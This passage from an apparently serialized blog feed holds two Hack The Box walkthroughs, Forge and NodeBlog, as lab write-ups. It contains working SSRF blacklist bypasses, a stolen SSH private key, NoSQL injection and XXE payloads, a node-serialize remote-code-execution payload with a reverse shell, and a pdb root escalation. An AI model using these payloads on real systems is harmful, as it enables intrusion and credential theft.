attacker machine, and we got a hit:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.111 - - [] \"GET /Forge.png HTTP/1.1\" 200 -  Then, the server generates a random URL where the image is located:\nIt is also possible to upload files that are not an image. For example, this HTML document:\n\u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\"en\"\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Test\u0026lt;/title\u0026gt; \u0026lt;meta charset=\"uft-8\"\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Test\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Although the browser will complain that the file is not an image, using curl we can see the uploaded HTML document:\n$ curl http://forge.htb/uploads/lquBPTyay70DnGJwpCFG \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\"en\"\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Test\u0026lt;/title\u0026gt; \u0026lt;meta charset=\"uft-8\"\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Test\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Testing SSRF Now, we can try some Server Side Request Forgery (SSRF) payloads because it is likely to be vulnerable (the name of the machine is \u0026ldquo;Forge\u0026rdquo;). To automate the process, we can use this short Python script: ssrf.py (detailed explanation here). This script only uploads the image URL and requests it using the generated URL.\nWe test some URL and see that there are some blacklisted addresses:\n$ python3 ssrf.py http://forge.htb URL contains a blacklisted address! $ python3 ssrf.py http://localhost URL contains a blacklisted address! $ python3 ssrf.py http://127.0.0.1 URL contains a blacklisted address!  Although this blacklist can be bypassed using http://10.10.11.111 or http://127.0.1.1, there is nothing interesting to do.\nAs a curiosity, the Apache server does not include a trailing slash when doing the redirect, and we have this error:\n$ python3 ssrf.py http://10.10.11.111/static An error occured! Error : HTTPConnectionPool(host=\u0026#39;forge.htbstatic\u0026#39;, port=80): Max retries exceeded with url: / (Caused by NewConnectionError(\u0026#39;\u0026lt;urllib3.connection.HTTPConnection object at 0x7f67f9ede100\u0026gt;: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution\u0026#39;))  Using curl we see that the issue is in the redirection process:\n$ curl -I http://10.10.11.111/static HTTP/1.1 302 Found Date: Server: Apache/2.4.41 (Ubuntu) Location: http://forge.htbstatic Content-Type: text/html; charset=iso-8859-1  The problem can be solved adding :80, so that it is appended to http://forge.htb:\n$ curl -I 'http://10.10.11.111/:80/static' HTTP/1.1 302 Found Date: Server: Apache/2.4.41 (Ubuntu) Location: http://forge.htb:80/static Content-Type: text/html; charset=iso-8859-1 $ python3 ssrf.py http://10.10.11.111/:80/static \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\" \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Index of /static\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Index of /static\u0026lt;/h1\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th valign=\"top\"\u0026gt;\u0026lt;img src=\"/icons/blank.gif\" alt=\"[ICO]\"\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;\u0026lt;a href=\"?C=N;O=D\"\u0026gt;Name\u0026lt;/a\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;\u0026lt;a href=\"?C=M;O=A\"\u0026gt;Last modified\u0026lt;/a\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;\u0026lt;a href=\"?C=S;O=A\"\u0026gt;Size\u0026lt;/a\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;\u0026lt;a href=\"?C=D;O=A\"\u0026gt;Description\u0026lt;/a\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th colspan=\"5\"\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td valign=\"top\"\u0026gt;\u0026lt;img src=\"/icons/back.gif\" alt=\"[PARENTDIR]\"\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\"/\"\u0026gt;Parent Directory\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt; - \u0026lt;/td\u0026gt;\u0026lt;td\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td valign=\"top\"\u0026gt;\u0026lt;img src=\"/icons/folder.gif\" alt=\"[DIR]\"\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\"css/\"\u0026gt;css/\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt;2021-05-27 04:00 \u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt; - \u0026lt;/td\u0026gt;\u0026lt;td\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td valign=\"top\"\u0026gt;\u0026lt;img src=\"/icons/folder.gif\" alt=\"[DIR]\"\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\"images/\"\u0026gt;images/\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt;2021-05-31 10:31 \u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt; - \u0026lt;/td\u0026gt;\u0026lt;td\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td valign=\"top\"\u0026gt;\u0026lt;img src=\"/icons/folder.gif\" alt=\"[DIR]\"\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\"js/\"\u0026gt;js/\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt;2021-05-27 06:39 \u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt; - \u0026lt;/td\u0026gt;\u0026lt;td\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th colspan=\"5\"\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.41 (Ubuntu) Server at forge.htb Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;  As previouslly said, there is nothing to do with http://forge.htb. We can try to access FTP, but again it is not allowed:\n$ python3 ssrf.py ftp://forge.htb Invalid protocol! Supported protocols: http, https  Finding another subdomain So, there must be another subdomain. We can find it using gobuster:\n$ gobuster vhost -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -r -q -u forge.htb Found: admin.forge.htb (Status: 200) [Size: 27]  After setting the subdomain in /etc/hosts, we see that only localhost can get the contents of the website:\n$ curl http://admin.forge.htb/ Only localhost is allowed!  Hence, we must use SSRF to access http://admin.forge.htb, but it is blacklisted:\n$ python3 ssrf.py http://admin.forge.htb URL contains a blacklisted address!  Although it is blacklisted, it seems that the validation is not perfect because it does not check capital letters:\n$ python3 ssrf.py http://ADMIN.FORGE.HTB \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Admin Portal\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\"\u0026gt; \u0026lt;header\u0026gt; \u0026lt;nav\u0026gt; \u0026lt;h1 class=\"\"\u0026gt;\u0026lt;a href=\"/\"\u0026gt;Portal home\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\"align-right margin-right\"\u0026gt;\u0026lt;a href=\"/announcements\"\u0026gt;Announcements\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\"align-right\"\u0026gt;\u0026lt;a href=\"/upload\"\u0026gt;Upload image\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;Welcome Admins!\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  This way, we are able to enumerate the internal subdomain admin-forge.htb. We see that it shows a route called /announcments:\n$ python3 ssrf.py http://ADMIN.FORGE.HTB/announcements \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Announcements\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\"\u0026gt; \u0026lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/announcements.css\"\u0026gt; \u0026lt;header\u0026gt; \u0026lt;nav\u0026gt; \u0026lt;h1 class=\"\"\u0026gt;\u0026lt;a href=\"/\"\u0026gt;Portal home\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\"align-right margin-right\"\u0026gt;\u0026lt;a href=\"/announcements\"\u0026gt;Announcements\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\"align-right\"\u0026gt;\u0026lt;a href=\"/upload\"\u0026gt;Upload image\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=\u0026lt;url\u0026gt;.\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Access to the machine Now we have another way to try SSRF, but from http://admin.forge.htb and having FTP enabled (with credentials user:heightofsecurity123!):\n$ python3 ssrf.py 'http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/' drwxr-xr-x 3 1000 1000 4096 Aug 04 19:23 snap -rw-r----- 1 0 1000 33 Sep 12 13:01 user.txt $ python3 ssrf.py 'http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/user.txt' 65d1bd86e04e41ae808a7965ff6e07c5  Now let\u0026rsquo;s see if the FTP password is reused for SSH:\n$ ssh user@forge.htb user@forge.htb: Permission denied (publickey).  It is not. We need a private key to access the machine via SSH.\nThe FTP server seems to be pointing to the home directory of user (because we saw the user.txt flag). So we can try to access ~/.ssh/id_rsa:\n$ python3 ssrf.py 'http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa' | tee id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 shlLupso7WoS0AAAAKdXNlckBmb3JnZQE= -----END OPENSSH PRIVATE KEY-----  Privilege escalation with sudo And now we have access to the machine. This user is allowed to execute a Python script as root:\n$ chmod 600 id_rsa $ ssh -i id_rsa user@forge.htb user@forge:~$ sudo -l Matching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py  This script starts a socket connection to allow a certain user execute some system commands:\nuser@forge:~$ cat /opt/remote-manage.py  #!/usr/bin/env python3 import socket import random import subprocess import pdb port = random.randint(1025, 65535) try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind(('127.0.0.1', port)) sock.listen(1) print(f'Listening on localhost:{port}') (clientsock, addr) = sock.accept() clientsock.send(b'Enter the secret passsword: ') if clientsock.recv(1024).strip().decode() != 'secretadminpassword': clientsock.send(b'Wrong password!\\n') else: clientsock.send(b'Welcome admin!\\n') while True: clientsock.send(b'\\nWhat do you wanna do: \\n') clientsock.send(b'[1] View processes\\n') clientsock.send(b'[2] View free memory\\n') clientsock.send(b'[3] View listening sockets\\n') clientsock.send(b'[4] Quit\\n') option = int(clientsock.recv(1024).strip()) if option == 1: clientsock.send(subprocess.getoutput('ps aux').encode()) elif option == 2: clientsock.send(subprocess.getoutput('df').encode()) elif option == 3: clientsock.send(subprocess.getoutput('ss -lnt').encode()) elif option == 4: clientsock.send(b'Bye\\n') break except Exception as e: print(e) pdb.post_mortem(e.__traceback__) finally: quit()  The commands are not vulnerable. In fact, the vulnerability here is the use of pdb if an exception is thrown. Once we enter in the pdb prompt, we can execute an interactive Python session (REPL) as root (because the script is executed with sudo):\nuser@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py Listening on localhost:1423  First, we need to enter the password, which is written in the code in plain text (secretadminpassword). To trigger pdb we can enter a letter instead of a valid number (we will cause a ValueError exception):\nuser@forge:~$ telnet localhost 1423 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. Enter the secret passsword: secretadminpassword Welcome admin! What do you wanna do: [1] View processes [2] View free memory [3] View listening sockets [4] Quit x  And then we have the pdb prompt:\nuser@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py Listening on localhost:1423 invalid literal for int() with base 10: b'x' \u0026gt; /opt/remote-manage.py(27)\u0026lt;module\u0026gt;() -\u0026gt; option = int(clientsock.recv(1024).strip()) (Pdb) ? Documented commands (type help \u0026lt;topic\u0026gt;): ======================================== EOF c d h list q rv undisplay a cl debug help ll quit s unt alias clear disable ignore longlist r source until args commands display interact n restart step up b condition down j next return tbreak w break cont enable jump p retval u whatis bt continue exit l pp run unalias where Miscellaneous help topics: ========================== exec pdb  If we type interact, we will get a Python REPL, and there we can spawn a shell:\n(Pdb) interact *interactive* \u0026gt;\u0026gt;\u0026gt; import pty \u0026gt;\u0026gt;\u0026gt; pty.spawn('/bin/bash')  Finally we have a shell as root, so we can read the root.txt flag:\nroot@forge:/home/user# cat /root/root.txt 3f3744e3624782a0fd2504a47923c347  ","image":"/images/HTB/Forge/Forge.png","permalink":"https://7rocky.github.io/en/htb/forge/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine has a Server-Side Request Forgery (SSRF) vulnerability from a subdomain to an FTP server. After that, there are sudo permissions to run a Python script with a debugger. Basic web pentesting bypassing techniques are needed to compromise this machine. This write-up uses a custom Python script to exploit the SSRF","time":7,"title":"Forge"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.139   Release: 10 / 01 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.139 -p 22,5000 Nmap scan report for 10.10.11.139 Host is up (0.056s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 5000/tcp open http Node.js (Express middleware) |_http-title: Blog Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 15.37 seconds  This machine has ports 22 (SSH) and 5000 (HTTP) open.\nWeb enumeration If we go to http://10.10.11.139:5000, we will find a blog built in Express.js (a web framework for Node.js):\nHere we can try to login:\nThe first this we can try are default credentials. During the process, we notice that the login form is vulnerable to user enumeration:\n$ curl 10.10.11.139:5000/login -sd 'user=asdf\u0026password=asdf' | grep Invalid Invalid Username $ curl 10.10.11.139:5000/login -sd 'user=admin\u0026password=asdf' | grep Invalid Invalid Password  And thus, we know that admin is a valid user. Then, we can try to make a brute force attack in order to enumerate more valid users:\n$ ffuf -w $WORDLISTS/names.txt -u http://10.10.11.139:5000/login -d 'user=FUZZ\u0026password=x' -mr 'Invalid Password' -H 'Content-Type: application/x-www-form-urlencoded' admin [Status: 200, Size: 1040, Words: 151, Lines: 30]  But it seems that there are no common usernames but admin.\nFinding a NoSQLi After trying some SQL injection payloads and common passwords, one could guess that the server is using MongoDB (MEAN stack: MongoDB, Express.js, Angular, Node.js). Hence, we can try some NoSQL injection payloads.\nPayloadsAllTheThings has a lot of payloads, ones using application/x-www-form-urlencoded and others using application/json.\nWe can try application/x-www-form-urlencoded (as in the previous curl commands), but none of them work. Let\u0026rsquo;s change the content type and see if it is correct:\n$ curl 10.10.11.139:5000/login -sd '{\"user\":\"admin\",\"password\":\"asdf\"}' -H 'Content-Type: application/json' | grep Invalid Invalid Password  Alright, now we can add some operators for MongoDB:\n$ curl 10.10.11.139:5000/login -sd '{\"user\":{\"$eq\":\"admin\"},\"password\":\"asdf\"}' -H 'Content-Type: application/json' | grep Invalid Invalid Password $ curl 10.10.11.139:5000/login -sd '{\"user\":{\"$ne\":\"admin\"},\"password\":\"asdf\"}' -H 'Content-Type: application/json' | grep Invalid Invalid Username $ curl 10.10.11.139:5000/login -sd '{\"user\":{\"$ne\":\"asdf\"},\"password\":\"asdf\"}' -H 'Content-Type: application/json' | grep Invalid Invalid Password  Using the following payload, we can bypass the login form and get a valid session cookie:\n$ curl 10.10.11.139:5000/login -isd '{\"user\":\"admin\",\"password\":{\"$regex\":\"\"}}' -H 'Content-Type: application/json' HTTP/1.1 200 OK X-Powered-By: Express Set-Cookie: auth=%7B%22user%22%3A%22admin%,%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D; Max-Age=900; Path=/; HttpOnly Content-Type: text/html; charset=utf-8 Content-Length: 2589 ETag: W/\"a1d-JGrC4mhnlEApoTWWPEhYOlLd+UA\" Date: Connection: keep-alive Keep-Alive: timeout=5 ...  Moreover, we can extract the password for admin using $regex operator. To extract the length of the password, we can increase the number until it matches (there is no output on the second command because there is no error message):\n$ curl 10.10.11.139:5000/login -sd '{\"user\":\"admin\",\"password\":{\"$regex\":\"^.{24}$\"}}' -H 'Content-Type: application/json' | grep Invalid Invalid Password $ curl 10.10.11.139:5000/login -sd '{\"user\":\"admin\",\"password\":{\"$regex\":\"^.{25}$\"}}' -H 'Content-Type: application/json' | grep Invalid  Then we can add characters until the regular expression matches and finally obtain the password. To automate the process, I used a Bash script called nosqli.sh. This script gets the length of the password and then extracts the password (detailed explanation here):\n$ bash nosqli.sh Password length: 25 Password: IppsecSaysPleaseSubscribe  Finding an XXE Using the password obtained, we can login successfully:\nHere, we can create a new article. However, once we try to save it, we get an error:\nThis will be interesting later, because we have the root path of the web application (/opt/blog).\nThere is another functionality that is upload a post. We can add a random file and get an XML error:\nSo, we must upload a valid XML document, such as this one:\n\u0026lt;?xml version=\"1.0\"?\u0026gt; \u0026lt;post\u0026gt; \u0026lt;title\u0026gt;ASDF\u0026lt;/title\u0026gt; \u0026lt;description\u0026gt;\u0026lt;/description\u0026gt; \u0026lt;markdown\u0026gt;\u0026lt;/markdown\u0026gt; \u0026lt;/post\u0026gt;  And we see that the server parses the XML document and fills the form to edit the blog post:\nAt this point, we can try to perform an XML External Entity (XXE) injection, that is, adding an entity that gets the content of a file and puts it in an element of the XML document. A simple XXE payload is this one:\n\u0026lt;?xml version=\"1.0\"?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u0026gt; ]\u0026gt; \u0026lt;post\u0026gt; \u0026lt;title\u0026gt;ASDF\u0026lt;/title\u0026gt; \u0026lt;description\u0026gt;\u0026amp;xxe;\u0026lt;/description\u0026gt; \u0026lt;markdown\u0026gt;\u0026lt;/markdown\u0026gt; \u0026lt;/post\u0026gt;  And if we upload this XML document, we get the file /etc/passwd in the description field:\nWith this vulnerability, we can read files from the server if we know the absolute path. For that purpose, I built a Python script called xxe.py (detailed explanation here).\nWe have the root path for the server from a previous error message (/opt/blog). The main file for a Node.js web application is usually: app.js, main.js, script.js, index.js or server.js. We can try this filenames, and get that server.js exists:\n$ pyhton3 xxe.py /opt/blog/server.js  const express = require('express') const mongoose = require('mongoose') const Article = require('./models/article') const articleRouter = require('./routes/articles') const loginRouter = require('./routes/login') const serialize = require('node-serialize') const methodOverride = require('method-override') const fileUpload = require('express-fileupload') const cookieParser = require('cookie-parser') const crypto = require('crypto') const cookie_secret = 'UHC-SecretCookie' // const session = require('express-session') const app = express() mongoose.connect('mongodb://localhost/blog') app.set('view engine', 'ejs') app.use(express.urlencoded({ extended: false })) app.use(methodOverride('_method')) app.use(fileUpload()) app.use(express.json()) app.use(cookieParser()) // app.use(session({ secret: 'UHC-SecretKey-123' })) function authenticated(c) { if (typeof c == 'undefined') return false c = serialize.unserialize(c) if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex'))) { return true } else { return false } } app.get('/', async (req, res) =\u0026gt; { const articles = await Article.find().sort({ createdAt: 'desc' }) res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) }) }) app.use('/articles', articleRouter) app.use('/login', loginRouter) app.listen(5000)  We could extract more source code based on the main file (namely, /opt/blog/routes/login.js, /opt/blog/routes/articles.js, /opt/blog/models/user.js and /opt/blog/models/article.js). However, server.js is enough to continue.\nFinding an insecure deserialization The JavaScript file shown above uses node-serialize, which is a Node.js module used to serialize and unserialize JSON documents. This module is known to have a Remote Code Execution vulnerability via unserialize. You can find more information and a simple proof of concept in snyk.io (CVE-2017-5941). We need to enter a payload like this one:\nconst serialize = require('node-serialize') const payload = `{\"rce\":\"_$$ND_FUNC$$_function() { require('child_process').exec('ls') }()\"}` serialize.unserialize(payload)  The unserialize method is used over the session cookie to check if the signature is correct. Hence, we can add the payload to the cookie, because it is in JSON format (using URL encoding).\nFor that purpose, I decided to build a simple Node.js script that authenticates and modifies the session cookie in order to inject the RCE payload and send a reverse shell. This script is called unserialize_rce.js (detailed explanation here).\nUsing this script, we are able to access into the machine as admin:\n$ node unserialize_rce.js 10.10.17.44 4444 [+] Login successful [+] RCE completed  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.139. Ncat: Connection from 10.10.11.139:55018. bash: cannot set terminal process group (861): Inappropriate ioctl for device bash: no job control in this shell admin@nodeblog:/opt/blog$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null admin@nodeblog:/opt/blog$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm admin@nodeblog:/opt/blog$ export TERM=xterm admin@nodeblog:/opt/blog$ export SHELL=bash admin@nodeblog:/opt/blog$ stty rows 50 columns 158  Privilege escalation Once as admin inside the machine, we can go to its home directory and read the user.txt flag:\nadmin@nodeblog:/opt/blog$ cd admin@nodeblog:~$ cat user.txt 7d30843b9570b5efd388820002409de2  Moreover, .bash_history is not linked to /dev/null, so we can read the last executed used by admin:\nadmin@nodeblog:~$ ls -la --time-style=+ total 36 drwxrwxrwx 1 admin admin 220 . drwxr-xr-x 1 root root 10 .. -rw------- 1 admin admin 1863 .bash_history -rw-r--r-- 1 admin admin 220 .bash_logout -rw-r--r-- 1 admin admin 3771 .bashrc drwx------ 1 admin admin 40 .cache -rw------- 1 admin admin 383 .dbshell -rw------- 1 admin admin 0 .mongorc.js drwxrwxr-x 1 admin admin 158 .pm2 -rw-r--r-- 1 admin admin 807 .profile -rw-r--r-- 1 admin admin 0 .sudo_as_admin_successful -rw------- 1 admin admin 10950 .viminfo -rw-r--r-- 1 root root 33 user.txt admin@nodeblog:~$ tail .bash_history node server.js vi server.js node server.js vi server.js node server.js vi server.js node 